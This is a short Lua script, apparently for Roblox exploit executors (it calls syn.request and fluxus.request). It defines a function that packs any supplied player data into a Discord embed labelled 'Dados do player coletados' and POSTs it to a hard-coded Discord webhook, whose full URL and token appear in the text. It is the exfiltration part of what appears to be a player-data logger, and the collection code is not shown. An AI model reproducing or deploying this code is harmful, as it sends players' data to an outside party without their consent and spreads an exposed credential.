local HttpService = game:GetService("HttpService")

function webhook(dados)
    local fields = {}
    for k, v in pairs(dados) do
        table.insert(fields, {
            name = k,
            value = tostring(v),
            inline = false
        })
    end

    local payload = {
        content = "<@1350457070972829810> 🔔 Dados do player coletados!",
        embeds = {{
            title = "📡 Chakes do Jogador",
            color = 3447003,
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local url = "https://discord.com/api/webhooks/1388246118940409967/_2_i1r49Tu_T8Z5naulq4Zpm95LombP5VzzKPJK4p9LCusWPeb7Y79wF1NfMmzBzSay5"
    local json = HttpService:JSONEncode(payload)

    local req = (http_request or request or syn and syn.request or fluxus and fluxus.request)
    if req then
        req({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end
end
